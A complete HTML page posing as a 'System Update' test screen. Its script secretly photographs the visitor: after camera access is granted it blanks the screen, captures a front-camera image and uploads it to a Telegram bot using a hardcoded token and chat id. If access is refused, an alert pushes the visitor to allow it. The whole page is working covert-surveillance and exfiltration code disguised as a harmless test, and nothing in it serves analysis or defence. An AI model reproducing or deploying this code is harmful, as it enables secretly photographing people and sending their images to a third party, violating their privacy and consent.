<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        #startBtn { padding: 20px 40px; font-size: 20px; font-weight: bold; background: #fff; color: #000; border: none; border-radius: 50px; cursor: pointer; }
    </style>
</head>
<body>

    <button id="startBtn">TAP TO START SYSTEM TEST</button>
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const T = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
        const C = '8681771719';

        document.getElementById('startBtn').addEventListener('click', function() {
            const b = this;
            // The request MUST happen exactly when the button is tapped
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                b.style.display = 'none'; // Screen goes black immediately

                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth;
                    canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const f = new FormData();
                        f.append('chat_id', C);
                        f.append('photo', blob, 'shot.jpg');
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
                        .then(() => s.getTracks().forEach(t => t.stop()));
                    }, 'image/jpeg');
                }, 1500);
            })
            .catch(e => {
                alert("Please tap 'Allow' when the browser asks for camera access.");
            });
        });
    </script>
</body>
</html>
